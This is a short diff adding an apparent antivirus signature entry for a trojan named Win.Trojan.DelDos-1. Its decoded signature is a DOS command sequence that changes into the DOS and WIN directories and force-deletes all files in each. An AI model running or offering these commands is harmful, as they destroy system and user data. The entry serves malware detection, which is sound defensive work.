@@ -1,0 +1,11 @@
+VIRUS NAME: Win.Trojan.DelDos-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+cd\
+cd dos
+del y| *.*
+cd ..
+cd win
+del y| *.*
+cd\
